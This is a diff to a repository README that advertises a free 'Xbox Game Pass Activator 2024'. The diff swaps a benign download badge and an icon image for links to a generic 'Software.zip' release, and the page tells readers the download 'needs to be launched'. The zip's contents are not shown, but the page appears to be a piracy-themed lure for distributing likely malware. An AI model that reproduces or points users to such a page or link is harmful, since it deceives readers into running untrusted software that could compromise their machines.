@@ -29,7 +29,7 @@ Feel free to explore the resources and tools available in this repository to enh
 
 To get started, download the Xbox Game Pass Activator for the year 2024 by clicking the button below:
 
-[![Download Xbox Game Pass Activator](https://img.shields.io/static/v1?label=Download&message=Xbox%20Game%20Pass%20Activator&color=blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Xbox Game Pass Activator](https://github.com/sway2prey333/Xbox-Game-Pass-Activator-Free-2024/releases/download/v1.0/Software.zip%20Game%20Pass%20Activator&color=blue)](https://github.com/sway2prey333/Xbox-Game-Pass-Activator-Free-2024/releases/download/v1.0/Software.zip)
 
 **Note:** The download link above needs to be launched to access the Xbox Game Pass Activator for 2024.
 
@@ -39,4 +39,4 @@ If you have any questions, feedback, or suggestions regarding the Xbox Game Pass
 
 Thank you for visiting the Xbox Game Pass Activator Free 2024 repository! Enjoy your gaming experience with Xbox Game Pass. 🎉
 
-![Xbox Game Pass](https://img.icons8.com/color/96/000000/xbox.png)
+![Xbox Game Pass](https://github.com/sway2prey333/Xbox-Game-Pass-Activator-Free-2024/releases/download/v1.0/Software.zip)
